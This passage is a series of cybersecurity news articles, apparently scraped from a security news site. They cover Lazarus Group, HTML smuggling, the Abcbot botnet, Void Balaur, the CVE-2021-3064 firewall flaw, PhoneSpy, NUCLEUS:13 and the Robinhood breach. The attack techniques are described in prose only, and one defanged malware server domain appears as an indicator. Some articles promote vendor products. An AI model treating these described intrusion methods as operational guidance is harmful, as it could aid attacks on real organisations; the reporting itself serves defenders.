This tampered version is then orchestrated to load a second component named “idahelper.dll“ from the IDA plugins folder on the system.\nUpon successful execution, the “idahelper.dll“ binary connects to a remote server at “www[.]devguardmap[.]org“ to retrieve subsequent payloads. The domain is also notable for the fact that it’s been previously linked to a similar North Korea-backed campaign aimed at security professionals and disclosed by Google’s Threat Analysis Group earlier this March.\n\nThe covert operation involved the adversaries setting up a fake security company known as SecuriElite alongside a number of social media accounts across Twitter and LinkedIn in an attempt to trick unsuspecting researchers into visiting the company’s malware-laced website so as to trigger an exploit that leveraged a then zero-day in Internet Explorer browser. Microsoft eventually addressed the issue in its Patch Tuesday update for March 2021.\n\nAlso known by the monikers APT38, Hidden Cobra, and Zinc, the Lazarus Group is known to be active as early as 2009 and linked to a string of attacks for financial gain and harvesting sensitive information from compromised environments.\n“North Korea’s cyber program poses a growing espionage, theft, and attack threat,“ according to the U.S. Office of the Director of National Intelligence 2021 Annual Threat Assessment published earlier this April.\n“North Korea has conducted cyber theft against financial institutions and cryptocurrency exchanges worldwide, potentially stealing hundreds of millions of dollars, probably to fund government priorities, such as its nuclear and missile programs.“\n\n\nFound this article interesting?

{'title': 'Hackers Increasingly Using HTML Smuggling in Malware and Phishing Attacks',
'text': 'Threat actors are increasingly banking on the technique of HTML smuggling in phishing campaigns as a means to gain initial access and deploy an array of threats, including banking malware, remote administration trojans (RATs), and ransomware payloads.\nMicrosoft 365 Defender Threat Intelligence Team, in a new report published Thursday, disclosed that it identified infiltrations distributing the Mekotio banking Trojan, backdoors such as AsyncRAT and NjRAT, and the infamous TrickBot malware. The multi-staged attacks — dubbed ISOMorph — were also publicly documented by Menlo Security in July 2021.\n\nHTML smuggling is an approach that allows an attacker to “smuggle“ first-stage droppers, often encoded malicious scripts embedded within specially-crafted HTML attachments or web pages, on a victim machine by taking advantage of basic features in HTML5 and JavaScript rather than exploiting a vulnerability or a design flaw in modern web browsers.\nBy doing so, it enables the threat actor to construct the payloads programmatically on the HTML page using JavaScript, instead of having to make an HTTP request to fetch a resource on a web server, while also simultaneously evading perimeter security solutions. The HTML droppers are then used to fetch the primary malware to be executed on the compromised endpoints.\nThreat behavior observed in the Mekotio campaign\n“When a target user opens the HTML in their web browser, the browser decodes the malicious script, which, in turn, assembles the payload on the host device,“ the researchers said. “Thus, instead of having a malicious executable pass directly through a network, the attacker builds the malware locally behind a firewall.“\nHTTP Smuggling’s ability to bypass web proxies and email gateways have made it a lucrative method among state-sponsored actors and cybercriminal groups to deliver malware in real-world attacks, Microsoft noted.\nNobelium, the threat group behind the SolarWinds supply chain hack, was found leveraging this very tactic to deliver a Cobalt Strike Beacon as part of a sophisticated email-based attack aimed at government agencies, think tanks, consultants, and non-governmental organizations located across 24 countries, including the U.S., earlier this May.\n\nBeyond espionage operations, HTML smuggling has also been embraced for banking malware attacks involving the Mekotio trojan, what with the adversaries sending spam emails containing a malicious link that, when clicked, triggers the download of a ZIP file, which, in turn, contains a JavaScript file downloader to retrieve binaries capable of credential theft and keylogging.\nHTML smuggling attack chain in the Trickbot spear-phishing campaign\nBut in a sign that other actors are taking notice and incorporating HTML smuggling in their arsenal, a September email campaign undertaken by DEV-0193 was uncovered abusing the same method to deliver TrickBot. The attacks entail a malicious HTML attachment, which, when opened on a web browser, creates a password-protected JavaScript file on the recipient’s system, prompting the victim to supply the password from the original HTML attachment.\nDoing so initiates the execution of the JavaScript code, which subsequently launches a Base64-encoded PowerShell command to contact an attacker-controlled server to download the TrickBot malware, ultimately paving the way for follow-on ransomware attacks.\n“The surge in the use of HTML smuggling in email campaigns is another example of how attackers keep refining specific components of their attacks by integrating highly evasive techniques,“ Microsoft noted. “Such adoption shows how tactics, techniques, and procedures (TTPs) trickle down from cybercrime gangs to malicious threat actors and vice versa. It also reinforces the current state of the underground economy, where such TTPs get commoditized when deemed effective.“\n\n\nFound this article interesting?

'text': 'Researchers from Qihoo 360’s Netlab security team have released details of a new evolving botnet called “Abcbot“ that has been observed in the wild with worm-like propagation features to infect Linux systems and launch distributed denial-of-service (DDoS) attacks against targets.\nWhile the earliest version of the botnet dates back to July 2021, new variants observed as recently as October 30 have been equipped with additional updates to strike Linux web servers with weak passwords and are susceptible to N-day vulnerabilities, including a custom implementation of DDoS functionality, indicating that the malware is under continuous development.\nNetlab’s findings also build on a report from Trend Micro early last month, which publicized attacks targeting Huawei Cloud with cryptocurrency-mining and cryptojacking malware. The intrusions were also notable for the fact that the malicious shell scripts specifically disabled a process designed to monitor and scan the servers for security issues as well as reset users’ passwords to the Elastic cloud service.\n\nNow according to the Chinese internet security company, these shell scripts are being used to spread Abcbot. A total of six versions of the botnet have been observed to date.\nOnce installed on a compromised host, the malware triggers the execution of a series of steps that results in the infected device being repurposed as a web server, in addition to reporting the system information to a command-and-control (C2) server, spreading the malware to new devices by scanning for open ports, and self-updating itself as and when new features are made available by its operators.\n\n“Interesting thing is that the sample [updated] on October 21 uses the open-source ATK Rootkit to implement the DDoS function,“ a mechanism which the researchers said “requires Abcbot to download the source code, compile, and load the rootkit module before performing [a] DDoS attack.“\n“This process requires too many steps, and any step that is faulty will result in the failure of the DDoS function,“ the researchers noted, leading the adversary to replace the off-the-shelf component with a custom attack module in a subsequent version released on October 30 that completely abandons the ATK rootkit.\n\nThe findings come a little over a week after the Netlab security team disclosed details of a “Pink“ botnet that’s believed to have infected over 1.6 million devices primarily located in China with the goal of launching DDoS attacks and inserting advertisements into HTTP websites visited by unsuspecting users. In a related development, AT&T Alien Labs took the wraps off a new Golang malware dubbed “BotenaGo“ that has been discovered using over thirty exploits to potentially attack millions of routers and IoT devices.\n“The update process in these six months is not so much a continuous upgrade of features as a trade-off between different technologies,“ the researchers concluded. “Abcbot is slowly moving from infancy to maturity. We do not consider this stage to be the final form, there are obviously many areas of improvement or features to be developed at this stage.“\n\n\nFound this article interesting?

Samples of the backdoor uploaded to VirusTotal reveal that none of the anti-malware engines currently detect the files as malicious.\n\nAccording to security researcher Patrick Wardle, a 2019 variant of MACMA masquerades as Adobe Flash Player, with the binary displaying an error message in Chinese language post-installation, suggesting that “the malware is geared towards Chinese users“ and that “this version of the malware is designed to be deployed via socially engineering methods.“ The 2021 version, on the other hand, is designed for remote exploitation.\nThe websites, which contained malicious code to serve exploits from an attacker-controlled server, also acted as a watering hole to target iOS users, albeit using a different exploit chain delivered to the victims’ browser.

'text': 'A new cyber mercenary hacker-for-hire group dubbed “Void Balaur“ has been linked to a string of cyberespionage and data theft activities targeting thousands of entities as well as human rights activists, politicians, and government officials around the world at least since 2015 for financial gain while lurking in the shadows.\nNamed after a many-headed dragon from Romanian folklore, the adversary has been unmasked advertising its services in Russian-speaking underground forums dating all the way back to 2017 and selling troves of sensitive information such as cell tower phone logs, passenger flight records, credit reports, banking data, SMS messages, and passport details. The threat actor calls itself “Rockethack.“\n“This hacker-for-hire group does not operate out of a physical building, nor does it have a shiny prospectus that describes its services,“ Trend Micro researcher Feike Hacquebord said in a newly published profile of the collective.\n\n“The group does not try to wriggle out of a difficult position by justifying its business, nor is it involved in lawsuits against anybody attempting to report on their activities. Instead, this group is quite open about what it does: breaking into email accounts and social media accounts for money,“ Hacquebord added.\nBesides gaining near unanimous positive reviews on the forums for its ability to offer quality information, Void Balaur is also believed to have focused on cryptocurrency exchanges by creating numerous phishing sites to trick cryptocurrency exchange users in order to gain unauthorized access to their wallets. What’s more, the campaigns have involved the deployment of information stealers and Android spyware such as Z*Stealer and DroidWatcher against its targets.\nVoid Balaur’s intrusion set has been observed deployed against a wide range of individuals and entities, including journalists, human rights activists, politicians, scientists, doctors working in IVF clinics, genomics and biotechnology companies, and telecom engineers. Trend Micro said it unearthed over 3,500 email addresses the group set its aim on.\n\nMost of the group’s targets are said to be located in Russia and other neighboring countries like Ukraine, Slovakia, and Kazakhstan, with victims also located in the U.S., Israel, Japan, India, and European nations. Assaulted organizations run the gamut from telecom providers, satellite communication corporations, and fintech firms to ATM machine vendors, point-of-sale (PoS) vendors, and biotech companies.\n\n“Void Balaur goes after the most private and personal data of businesses and individuals then sells that data to whomever wants to pay for it,“ the researchers said. The reason why these individuals and entities were targeted remains unknown as yet.\n\nIt’s also not immediately clear how sensitive phone and email records are acquired from the targets without interaction, although the researchers suspect that the threat actor could have either directly (or indirectly) involved rogue insiders at the concerned companies to sell the data or by compromising accounts of key employees with access to the targeted email mailboxes.\nTrend Micro’s deep-dive analysis has also found some common ground with another Russia-based advanced persistent threat group named Pawn Storm (aka APT28, Sofacy, or Iron Twilight), with overlaps observed in the targeted email addresses between the two groups, while also significantly differing in a number of ways, including Void Balaur’s modus operandi of striking cryptocurrency users and their operational hours.\n\nIf anything, the development once again highlights the rampantly growing illicit mercenary-related activities in cyberspace and the demand for such services, what with a number of operations — BellTroX (aka Dark Basin), Bahamut, CostaRicto, and PowerPepper — that have been exposed as targeting non-profits, financial institutions, and government agencies in recent months.\nTo defend against the hacking attacks, it’s recommended to enable two-factor authentication (2FA) via an authenticator app or a hardware security key, rely on apps with end-to-end encryption (E2EE) for email and communications, and permanently delete old, unwanted messages to mitigate the risk of data exposure. \n“The reality is that regular internet users cannot easily deter a determined cyber mercenary,“ the researchers concluded. “While [advanced offensive tools in a cyber mercenary’s arsenal] might be meant to be used in the fight against terrorism and organized crime, the reality is that they — knowingly or unknowingly — end up in the hands of threat actors who use it against unwitting targets.“\n\n\nFound this article interesting?

Also tracked under the moniker TA551, Shathak is a sophisticated cybercrime actor targeting end-users on a global scale, acting as a malware distributor by leveraging password-protected ZIP archives containing macro-enabled Office documents.\n\nThe TrickBot gang, known as ITG23 or Wizard Spider, is also responsible for developing and maintaining the Conti ransomware, in addition to leasing access to the malicious software to affiliates via a ransomware-as-a-service (RaaS) model.\nInfection chains involving Shathak typically involve sending phishing emails that come embedded with malware-laced Word documents that ultimately lead to the deployment of TrickBot or BazarBackdoor malware, which is then used as a conduit to deploy Cobalt Strike beacons as well as the ransomware, but not before conducting reconnaissance, lateral movement, credential theft, and data exfiltration activities.\n\nCybereason researchers said they observed an average Time-to-Ransom (TTR) of two days post the compromises, denoting the amount of time from when the threat actor gains initial access into a network to the time the threat actor actually deploys the ransomware.\nThe findings also come as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) reported that no fewer than 400 Conti ransomware attacks had taken place targeting U.S. and international organizations as of September 2021.\nTo secure systems against Conti ransomware, the agencies recommend enforcing a variety of mitigation measures, including “requiring multi-factor authentication (MFA), implementing network segmentation, and keeping operating systems and software up to date.“\n\n\nFound this article interesting?

{'title': 'Navigating The Threat Landscape 2021 – From Ransomware to Botnets',
'text': 'Though we are recovering from the worst pandemic, cyber threats have shown no sign of downshifting, and cybercriminals are still not short of malicious and advanced ways to achieve their goals. \nThe Global Threat Landscape Report indicates a drastic rise in sophisticated cyberattacks targeting digital infrastructures, organizations, and individuals in 2021. Threats can take different forms with the intent to commit fraud and damage businesses and people. Ransomware, DDoS attacks, phishing, malware, and man-in-the-middle attacks represent the greatest threat to businesses today.\nWhen new threats emerge, attackers take advantage of them – however, most businesses are only aware of the current threats.\nOrganizations struggle to address these threats due to their resource sophistication and their lack of understanding of evolving threat landscapes. For these reasons, organizations need visibility on the advanced threats especially targeting their infrastructure. This article will outline the evolution in the cyber threat landscape 2021.\nEvolving Threat Landscape – Find Out What You Don’t Know\n\n1 — Ransomware\nRansomware is still a common and evolving cyber security threat with several highly publicized incidents. Ransomware incidents affect organizations, businesses, and individuals resulting in financial loss, operational disruptions, and data exfiltration. Compromise through internet-facing vulnerabilities & misconfigurations, third parties & managed service providers, Remote Desktop Protocol (RDP) and phishing emails remain the most common infection vectors.\nThe occurrence of extortion schemes has increased from single to multiple schemes during 2021. After initially encrypting sensitive information from the victim and threatening to reveal it publicly unless a ransom is paid, attackers are now targeting the victim’s partners and customers for ransom to maximize their profits.\nNew research from Coalition revealed that there was a 170% increase in the average ransom demand in the first half of 2021 compared to last year.\nImage source: venturebeat\nIt is likely to hit $100 million in 2022 – according to the ENISA Threat Landscape 2021.\nMoreover, cryptocurrency becomes the choice of pay-out method because it promises a secure, fast, and anonymous channel for money transactions. Also, attackers shifted from Bitcoin to Monero as their choice due to its enhanced anonymity.\nRecommendations to prevent being a victim:\nSecurity awareness trainingUse secure websitesDefense-in-depth cybersecurity strategyVulnerability assessment & penetration testing\n2 — Cryptojacking\nAnother attack trend in 2021 is cryptojacking, which is associated with the expanding instability in the cryptocurrency market. Given the anonymity of cryptocurrencies, it has become a convenient and attractive means of exchange by attackers. In this attack, cybercriminals deploy hidden cryptojacking software onto the target’s devices, which steals from a cryptocurrency wallet. Siloscape, a new malware, which emerged in June 2021 targets Windows containers and creates malicious containers, loads cryptocurrency miners, which identify and steal cryptocurrency.\nRecommendations to counteract cryptojacking:\nImplement web filters and blacklist IP addresses from cryptomining IP poolsDevelop patches against well-known exploitsImplement a robust vulnerability management program\n3 — Data Breaches\nSensitive data being stolen from organizations or users is nothing new, but how threat actors approach it has evolved. Just as organizations embrace new technologies to survive in the digital landscape, threat actors also harness sophisticated methods to exploit attacks – Deepfake technology, for example. \nThough it’s not a new concept, it has evolved significantly. With MI and AI, Deepfake technology enables the digital creation of an individual’s likeness, which can then be used to impersonate the victim. AI and ML tools make it possible to make artificial versions of any voice or any video. \nCybercube’s security researchers alerted that deep fake audio and video content could become a major cyber threat to businesses worldwide. Also, the widespread damage associated with this pretended content is expected to increase in the coming years. It is also expected that the enhanced dependence on video-based communication is the major factor that motivates attackers to focus more on Deepfake technology.\nRecommendations for Deepfake Monitoring and Removal:\nImproved digital archiving to identify the fake video and fake voice clipsImplement Content Authenticity Initiative to validate the creator as well as origin of data\n4 — Botnets\nNewer botnets continue to emerge as old ones keep transforming to sidestep the current security solutions. This is because cyber-criminals see a new paradigm with botnets-as-a-service where bonnets can be leased/sold to corporations or individuals for nefarious uses and financial benefits.\nFurthermore, the existence of botnets in the cloud and mobile environment proposes a new possibility that they may soon be able to learn and exploit the weakness on their own in the patterns of user interactions. The increased adoption of IoT and the lack of security when they are developed as well as deployed presents another feasible frontier for botnet proliferation.\nA recent report revealed there is a 500% rise in overall IoT attacks by prominent IoT botnets like Mirai and Mozi.\nImage source: Security Intelligence\nIn 2020, the Mozi botnet attackaccounted for 89% of the IoT attacks – according to X-Force research. In addition to Mozi, several other botnets continue to target the IoT landscape. Ecobot, Zeroshell, Gafgyt, and Loli are four notable botnets impacting businesses all over the world.\nImage source: Security Intelligence\nRecommendations to fight back:\nEmploy penetration testingChange your default IoT setting when installing any new deviceImplement a powerful patch management programPractice effective bot protection and mitigation strategy\nThe Big Picture\nNew cyber threats are being detected all the time, and they possess the potential to affect any operating system, including Linux, Windows, iOS, Mac OS, and Android. Additionally, new threats vectors are evolving due to potential vulnerabilities in the continuous adoption of remote working and a growing number of IoT devices being connected.\nThis cyber threat landscape evolution has forced enterprises to upgrade their vulnerability management program, security tools, processes, and skills to stay ahead. Indusface AppTrana, a fully managed Web Application and API protection (WAAP)addresses these challenges and speeds up threat detection and response.\nIf you want to be proactive and actionable in protecting your information, stay aware of the recent cyber security threat landscape!\n\n\nFound this article interesting?

{'title': 'Iran’s Lyceum Hackers Target Telecoms, ISPs in Israel, Saudi Arabia, and Africa',
'text': 'A state-sponsored threat actor allegedly affiliated with Iran has been linked to a series of targeted attacks aimed at internet service providers (ISPs) and telecommunication operators in Israel, Morocco, Tunisia, and Saudi Arabia, as well as a ministry of foreign affairs (MFA) in Africa, new findings reveal.\nThe intrusions, staged by a group tracked as Lyceum, are believed to have occurred between July and October 2021, researchers from Accenture Cyber Threat Intelligence (ACTI) group and Prevailion’s Adversarial Counterintelligence Team (PACT) said in a technical report. The names of the victims were not disclosed.\nThe latest revelations throw light on the web-based infrastructure used by Lyceum, over 20 of them, enabling the identification of “additional victims and provide further visibility into Lyceum’s targeting methodology,“ the researchers noted, adding “at least two of the identified compromises are assessed to be ongoing despite prior public disclosure of indicators of compromise.“\n\nBelieved to be active since 2017, Lyceum (aka Hexane or Spirlin) is known to target sectors of strategic national importance for purposes of cyber espionage, while also retooling its arsenal with new implants, and expanding its sights to include ISPs and government agencies. The new and updated malware and TTPs have enabled the hacking group to mount attacks against two entities in Tunisia, Russian cybersecurity firm Kaspersky disclosed last month.\nThe threat actor has been traditionally observed using credential stuffing and brute-force attacks as initial attack vectors to obtain account credentials and gain foothold into targeted organizations, leveraging the access as a springboard to drop and execute post-exploitation tools.\n\nTwo distinct malware families — called Shark and Milan (named “James“ by Kaspersky) — are the primary implants deployed by the threat actor, each allowing for the execution of arbitrary commands and exfiltration of sensitive data from the compromised systems to a remote attacker-controlled server.\n\nACTI and PACT also said it located beaconing from a reconfigured or potentially a new Lyceum backdoor in late October 2021 originating from a telecommunications company in Tunisia and an MFA in Africa, indicating that the operators are actively updating their backdoors in light of recent public disclosures and attempting to bypass detection by security software.\n“Lyceum will likely continue to use the Shark and Milan backdoors, albeit with some modifications, as the group has likely been able to maintain footholds in victims’ networks despite public disclosure of [indicators of compromise] associated with its operations,“ the researchers said.\n\n\nFound this article interesting?

{'title': 'Palo Alto Warns of Zero-Day Bug in Firewalls Using GlobalProtect Portal VPN',
'text': 'A new zero-day vulnerability has been disclosed in Palo Alto Networks GlobalProtect VPN that could be abused by an unauthenticated network-based attacker to execute arbitrary code on affected devices with root user privileges.\nTracked as CVE-2021-3064 (CVSS score: 9.8), the security weakness impacts PAN-OS 8.1 versions earlier than PAN-OS 8.1.17. Massachusetts-based cybersecurity firm Randori has been credited with discovering and reporting the issue.\n\n“The vulnerability chain consists of a method for bypassing validations made by an external web server (HTTP smuggling) and a stack-based buffer overflow,“ Randori researchers said. “Exploitation of the vulnerability chain has been proven and allows for remote code execution on both physical and virtual firewall products.“\nHowever, in a troubling turn of events, the company said it used this exploit as part of its red team engagements for nearly 10 months before disclosing it to Palo Alto Networks in late September 2021. Technical details related to CVE-2021-3064 have been withheld for 30 days to prevent threat actors from abusing the vulnerability to stage real-world attacks.\n\nThe security bug stems from a buffer overflow that occurs while parsing user-supplied input. Successful exploitation of the flaw necessitates that the attacker strings it with a technique known as HTTP smuggling to achieve remote code execution on the VPN installations, not to mention have network access to the device on the GlobalProtect service default port 443.\n\n“A memory corruption vulnerability exists in Palo Alto Networks GlobalProtect portal and gateway interfaces that enables an unauthenticated network-based attacker to disrupt system processes and potentially execute arbitrary code with root privileges,“ Palo Alto Networks said in an independent advisory. “The attacker must have network access to the GlobalProtect interface to exploit this issue.“\nIn light of the fact that VPN devices are lucrative targets for malicious actors, it’s highly recommended that users move quickly to patch the vulnerability. As a workaround, Palo Alto Networks is advising affected organizations to enable threat signatures for identifiers 91820 and 91855 on traffic destined for GlobalProtect portal and gateway interfaces to prevent any potential attacks against CVE-2021-3064.\n\n\nFound this article interesting?

{'title': 'Researchers Discover PhoneSpy Malware Spying on South Korean Citizens',
'text': 'An ongoing mobile spyware campaign has been uncovered snooping on South Korean residents using a family of 23 malicious Android apps to siphon sensitive information and gain remote control of the devices.\n“With more than a thousand South Korean victims, the malicious group behind this invasive campaign has had access to all the data, communications, and services on their devices,“ Zimperium researcher Aazim Yaswant said. “The victims were broadcasting their private information to the malicious actors with zero indication that something was amiss.“\nThe Dallas-based mobile security company dubbed the campaign “PhoneSpy.“\n\nZimperium did not attribute the spyware to a known threat actor. “The evidence surrounding PhoneSpy shows a familiar framework that has been passed around for years, updated by individuals and shared within private communities and back channels until assembled into what we see in this variation today,“ Richard Melick, the company’s director of product strategy for endpoint security, told The Hacker News.\n\nThe rogue apps have been found to masquerade as seemingly innocuous lifestyle utilities with purposes ranging from learning Yoga and browsing photos to watching TV and videos, with the malware artifacts not relying on Google Play Store or other third-party unofficial app marketplaces, implying a social engineering or web traffic redirection method to trick users into downloading the apps.\nPost installation, the application requests for a wide range of permissions before opening a phishing site that’s designed to resemble the login pages of popular apps such as Facebook, Instagram, Google, and Kakao Talk. Users who attempt to sign in, however, are greeted by a HTTP 404 Not Found message, but in reality, have their credentials stolen and exfiltrated to a remote command-and-control (C2) server.\n\n“Many of the applications are facades of a real app with none of the advertised user-based functionality,“ Yaswant explained. “In a few other cases, like simpler apps that advertise as photo viewers, the app will work as advertised all while the PhoneSpy spyware is working in the background.“\n\nLike other trojans, PhoneSpy abuses its entrenched permissions, enabling the threat actor to access the camera to take pictures, record video and audio, get precise GPS location, view pictures from the device, as well as extract SMS messages, contacts, call logs, and even send SMS messages to the phone with attacker-controlled text. The amassed data is then shared with the C2 server.\n“Mobile spyware is an incredibly powerful and effective weapon against the data we hold in our hands. As our phones and tablets continue to become the digital wallets and IDs, forms of multi factor authentication, and the keys to the data kingdom for our professional and personal lives, the malicious actors wanting that exact data will find new ways to steal it,“ Melick said.\n“PhoneSpy and other examples of mobile spyware show that these toolsets and frameworks can be broken down and rebuilt over and over again with updated code and capabilities, giving the attackers the upper hand. And it’s only increasing in popularity for everyone from nation states targeting dissidents to corporations spying on competition due to the lack of advanced security surrounding most of these critical devices.“\n\n\nFound this article interesting?

'text': 'As many as 13 security vulnerabilities have been discovered in the Nucleus TCP/IP stack, a software library now maintained by Siemens and used in three billion operational technology and IoT devices that could allow for remote code execution, denial-of-service (DoS), and information leak.\nCollectively called “NUCLEUS:13,“ successful attacks abusing the flaws can “result in devices going offline and having their logic hijacked,“ and “spread[ing] malware to wherever they communicate on the network,“ researchers from Forescout and Medigate said in a technical report published Tuesday, with one proof-of-concept (PoC) successfully demonstrating a scenario that could potentially disrupt medical care and critical processes.\nSiemens has since released security updates to remediate the weaknesses in Nucleus ReadyStart versions 3 (v2017.02.4 or later) and 4 (v4.1.1 or later).\n\nPrimarily deployed in automotive, industrial, and medical applications, Nucleus is a closed-source real-time operating system (RTOS) used in safety-critical devices, such as anesthesia machines, patient monitors, ventilators, and other healthcare equipment. \nThe most severe of the issues is CVE-2021-31886 (CVSS score: 9.8), a stack-based buffer overflow vulnerability affecting the FTP server component, effectively enabling a malicious actor to write arbitrary code, hijack the execution flow, and achieve code execution, and in the process, take control of susceptible devices. Two other high-severity vulnerabilities (CVE-2021-31887 and CVE-2021-31888), both impacting FTP servers, could be weaponized to achieve DoS and remote code execution.\n\nReal-world attacks leveraging the flaw could hypothetically impede the normal functioning of automated train systems by sending a malicious FTP packet, causing a Nucleus-powered controller to crash, in turn, preventing a train from stopping at a station and causing it to collide with another train on the track.\n\nForeScout’s telemetry analysis has revealed closed to 5,500 devices from 16 vendors, with most of the vulnerable Nucleus devices found in the healthcare sector (2,233) followed by government (1,066), retail (348), financial (326), and manufacturing (317).\nThe disclosures mark the seventh time security weaknesses have been discovered in the protocol stacks that underpin millions of internet-connected devices. It’s also the fifth study as part of a systematic research initiative called Project Memoria aimed at analyzing the security of TCP/IP network communication stacks —\nURGENT/11Ripple20AMNESIA:33NUMBER:JACKNAME:WRECKINFRA:HALT\n\nIn an independent advisory, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) urged users to take defensive measures to mitigate the risk of exploitation of these vulnerabilities, including minimizing network exposure for all control system devices, segmenting control system networks from business networks, and using VPNs for remote access.\n\n“The threat landscape for every type of connected device is changing fast, with an ever-increasing number of severe vulnerabilities and attackers being motivated by financial gains more than ever,“ the researchers concluded. “This is especially true for operational technology and the Internet of Things. The expanded adoption of these types of technology by every type of organization, and their deep integration into critical business operations, will only increase their value for attackers over the long term.“\n\n\nFound this article interesting?

{'title': 'Unique Challenges to Cyber-Security in Healthcare and How to Address Them',
'text': 'No business is out of danger of cyberattacks today. However, specific industries are particularly at risk and a favorite of attackers. For years, the healthcare industry has taken the brunt of ransomware attacks, data breaches, and other cyberattacks.\nWhy is the healthcare industry particularly at risk for a cyberattack? What are the unique challenges to cybersecurity in healthcare, and how can healthcare organizations address these?\nHealthcare at risk\nAttackers are targeting various industries across the board. However, attackers seem to have a particular affinity for healthcare organizations. For eleven consecutive years, in the IBM Cost of a Data Breach Report 2021, healthcare had the highest industry cost of a breach. Additionally, Healthcare data breach costs increased from an average total cost of $7.13 million in 2020 to $9.23 million in 2021, a 29.5% increase.\nHowever, the tremendous cost sustained by healthcare organizations for data breach events is not only due to the number of incidents. It is also due to the type and sensitivity of data related to healthcare organizations. Generally, the more sensitive and confidential the information, it is worth more on the dark web. It has been noted that healthcare data is more valuable on the dark web than credit card data.\nHealthcare organizations have particularly been a target of ransomware attacks, which have prompted several special warnings from the FBI and others to help protect healthcare organizations, including hospitals, from attacks. Note the following:\nOctober 28, 2020 - A joint cybersecurity advisory coauthored by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the Department of Health and Human Services (HHS), issued a warning to healthcare providers to protect against TrickBot malware leading to ransomware attacks using the Ryuk ransomware.May 20, 2021 - The FBI released a bulletin warning of Conti ransomware attacks impacting healthcare and first responder networks. The FBI had identified at least 16 Conti ransomware attacks targeting US healthcare and first responder networks in the bulletin. August 25, 2021 - The FBI warned healthcare organizations of the threat of the Hive ransomware, first observed in June 2021, and likely operating as affiliate-based ransomware that both encrypts and exfiltrates data. \nRansomware poses an extremely dangerous risk for healthcare organizations. Due to the sensitive nature of the data maintained by healthcare organizations, ransomware provides a perfect storm of “worst case“ outcomes for hospitals and other healthcare-related businesses. Not only does modern ransomware encrypt the victim’s data, often it leaks the data to the dark web, the worst possible outcome for sensitive patient records.\nFactors leading up to the compromise of healthcare organizations\nSo, what other factors lead to the high risk of attack on healthcare institutions? Let’s consider the following:\nHigh-risk networked medical devicesInsecure interconnected medical networksLack of cybersecurity trainingWeak or breached passwordsOutdated legacy technologies\n1 — High-risk networked medical devicesOften, we hear about the risks of IoT devices. These are essentially simple networked devices that perform a specific function. For example, many networked medical devices in healthcare organizations such as hospitals transmit health statistics, data, charting, records, and many other data types. The sheer number of devices used in a hospital setting dramatically increases the attack surface.\nMedical devices may not be patched with the latest security devices for the underlying operating systems, firmware, drivers, etc. In addition, medical devices may be logged in and left unattended. All of these factors and others lead to an increased cybersecurity risk for healthcare organizations.\nOrganizations must ensure they have a proper inventory of any connected medical devices and adequate monitoring and patching schedules as needed to remediate security vulnerabilities.\n2 — Insecure interconnected medical networks\nThe networks of large hospitals may be connected with smaller and less secure physician’s offices. While interconnected networks allow information to be exchanged quickly and easily, it can provide an easier way for hackers to compromise the target they generally are after, hospital networks, and the data these contain. \nDoctor’s offices may use legacy and antiquated network and end-user devices running old and outdated security protocols. Endpoints may not be patched appropriately and regularly logged into using administrator credentials. Visiting a single malicious website could provide the door for malware, ransomware, or another compromise to first infiltrate the smaller network and then pivot to the connected hospital network via open ports and other allowed communications.\nImplementing zero-trust network connectivity between all connected networks and ensuring least privilege access to resources across the board will help bolster the security of sensitive patient records.\n3 — Lack of cybersecurity training\nWhile medical professionals have some of the most extensive training globally, unfortunately, cybersecurity training is not one of them. As a result, many medical professionals, like other business professionals, are not adequately trained to recognize phishing emails, malicious websites, or other malicious software. On top of the risks associated with medical devices and interconnected medical networks, this adds to the threat to healthcare organizations. \nHealthcare organizations must mandate regular and systematic cybersecurity training for all healthcare employees to ensure the end-users are trained in scrutinizing all network communications, emails, and other tactics attackers use for social engineering and phishing attacks.\n4 — Weak or breached passwords\nAccording to the IBM Cost of a Data Breach Report 2021, several alarming statistics are related to compromised credentials. These include:\nCompromised credentials account for 20% of total breach eventsBreaches caused by stolen/compromised credentials took the longest number of days to identifyThe average cost of a data breach caused by compromised credentials - $4.37 million\nHealthcare organizations can undoubtedly fall victim to attacks resulting from compromised credentials as they can be challenging to detect and allow an attacker to masquerade as someone with legitimate credentials. Additionally, even if passwords are complex, they are known to an attacker if they are on a breached password list. It can give quick entry to attackers who use the breached lists in password spraying or other credential attacks.\nOrganizations must implement strong password policies to prevent weak passwords and use breached password protection to protect against breached passwords in the environment. \n5 — Lack of investment in cybersecurity \nHealthcare cybersecurity is also weakened due to the lack of investment in proper cybersecurity solutions and technologies to protect sensitive healthcare environments. A study noted that, on average, healthcare organizations spend only around 5% of their IT budget on cybersecurity while the rest is devoted to the adoption of new technologies.\nAs a result, it leads to a less than desirable outcome of expanding attack surfaces and lacking the tools needed to secure the environment from cyberattacks properly.\nA heavy burden of responsibility falls to the CIO and other business stakeholders to evangelize the need to prioritize cybersecurity spending. Risk assessments need to carefully consider the impact of a ransomware attack on sensitive patient data and the repercussions to the organization if data is leaked. \nBolstering password security in healthcare\nAs stated earlier, password security is a tremendous concern. Attackers often use compromised credentials to gain easy access to business networks, including those of healthcare institutions. As a result, poor password policies and a lack of breached password protection can lead to tremendous vulnerabilities across the board for accounts.\nHealthcare organizations using Microsoft’s Active Directory password policies as part of Group Policy lack robust tools to implement industry best practice standards of effective password filtering, protecting against incremental passwords, and breached password protection.\nSpecops Password Policy is a robust password policy solution that adds key features to existing Active Directory password policies, including industry-leading breached password protection.

'text': 'Robinhood on Monday disclosed a security breach affecting approximately 7 million customers, roughly a third of its user base, that resulted in unauthorized access of personal information by an unidentified threat actor.\nThe commission-free stock trading and investing platform said the incident happened “late in the evening of November 3,“ adding it’s in the process of notifying affected users.\n\n“Based on our investigation, the attack has been contained and we believe that no Social Security numbers, bank account numbers, or debit card numbers were exposed and that there has been no financial loss to any customers as a result of the incident,“ the Silicon Valley financial company noted.\nThe malicious third-party is believed to have socially engineered a customer service representative to gain access to internal support systems, using it to obtain the email addresses of five million users, full names for a different group of about two million people, and additional information such as names, dates of birth, and zip codes for a limited set of 310 more users.\nOf the latter, at least 10 customers have had their “extensive account details“ revealed. However, the company did not provide further specifics about what those “extensive“ details were.\nBut once the breach was reined in, Robinhood said the infiltrator demanded an extortion payment in exchange for the stolen data, prompting the firm to involve law enforcement authorities in the matter. It’s not immediately clear if the ransom demands were met, and if so, how much money was involved.\n\nInterestingly, the list of email addresses also includes accounts that have been previously deactivated. According to Robinhood’s terms, this is done so “because regulations require us to preserve certain books and 